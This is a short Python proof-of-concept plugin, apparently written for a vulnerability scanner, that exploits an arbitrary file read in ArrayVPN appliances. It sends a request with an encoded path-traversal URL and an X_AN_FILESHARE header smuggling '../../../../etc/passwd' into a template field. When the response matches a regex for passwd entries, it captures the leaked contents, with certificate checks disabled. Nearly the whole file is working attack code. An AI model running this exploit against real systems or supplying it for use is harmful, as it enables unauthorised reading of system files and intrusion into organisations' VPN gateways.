#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/pJQIAox1EK9gE-XHF62UuQ',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'ArrayVPN 任意文件读取',

      'level'     :   'medium',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/2/2',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'X_AN_FILESHARE': 'uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd',
      }
  target = r'/prx/000/http/localhost/client_sec/%25%30%30%2e%2e%2f%2e%2e%2f%2e%2e%2f%61%64%64%66%6f%6c%64%65%72'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret